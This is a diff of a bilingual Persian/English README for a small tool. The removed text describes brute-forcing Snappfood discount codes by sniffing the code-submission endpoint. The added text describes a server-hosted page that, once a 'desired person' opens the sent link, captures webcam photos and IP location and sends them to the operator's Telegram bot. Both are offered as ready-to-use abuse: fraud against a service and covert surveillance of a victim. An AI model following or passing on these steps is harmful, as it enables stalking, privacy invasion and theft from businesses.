@@ -1,38 +1,30 @@
-<p align="center"><img src='https://files.virgool.io/upload/users/104419/posts/dmviwncef8fg/01p6rur2cptj.png'></p>
+<p align="center"><img src='https://www.ma-no.org/cache/galleries/contents-2186/860-300/image-webcam-with-javascript.jpg'></p>
 
-# کد تخفیف رایگان اسنپ فود
+# گرفتن عکس و موقعیت مکانی ایپی
 
-یک اسکریپت که میتواند کد تخفیف رایگان اسنپ فود رایگان بدست آورد !
+یک ابزار برای عکس گرفتن و بدست اوردن موقعیت مکانی شخص مورد نظر
 
-https://user-images.githubusercontent.com/111338534/202714267-96f29b36-9cb7-43b3-b06b-0a53259ea427.mp4?width=100&height=100
 
 ## نحوه اجرا : 
 
-- ابتدا وارد وبسایت https://snappfood.ir میشوید و وارد حساب کاربری میشوید. 
-- یک غذا رو انتخاب میکنید و به صفحه وارد کردن کد تخفیف میروید .
-- یک متن تستی در قسمت ارسال کد تخفیف میگذارید و مرورگر رو در حالت اسنیف قرار میدهید.
--ادرسی که کد ارسال شد رو در لاین 25 اسکریپت قرار میدهید.
-- بعد از اجرا کردن اسکریپت باید یک فایل از کد تخفیف های رندوم داشته باشید که اسکریپت آنها رو تست میکنه.
-- بعد از اجرای اسکریپت نام فایلی txt که کد های رندوم در ان قرار دارد رو به اسکریپت میدهید.
-- اسکریپت شروع به تست کد ها میکنه و هرکدوم درست باشه بهتون خبر میده.
+- تمامی فایل ها رو در سرور اپلود میکنید 
+- فایل config.php را باز کرده و در لاین 3 توکن ربات تلگرام , در لاین 4 ایدی عددی اکانت خودتون و در لاین 5 مسیر اجرایی فایل.
+- لینک فایل رو به شخص مورد نظر میدهید و بعد از دسترسی عکس ها به ربات تلگرام ارسال میشوند.
 
 موفق باشید
 
 -------------------------------------------------------------------------
 
-# Snapfood free discount code
+# Capture photos and IP location
 
-A script that can get a free Snapfood discount code!
+A tool to take photos and get the location of the desired person
+
 
 ## How to run:
 
-- First, enter the website https://snappfood.ir and enter the user account.
-- You choose a food and go to the page to enter the discount code.
-- You put a test text in the discount code submission section and put the browser in sniff mode.
-- You put the address where the code was sent in line 25 of the script.
-- After running the script, you should have a random discount code file that the script tests.
-- After running the script, you give the name of the txt file that contains the random codes to the script.
-- The script starts testing the codes and informs you if each one is correct.
+- You upload all the files to the server
+- Open the config.php file and enter the Telegram bot token in line 3, your account number in line 4, and the file execution path in line 5.
+- You give the file link to the desired person and after access, the photos will be sent to the Telegram bot.
 
 Good luck
 
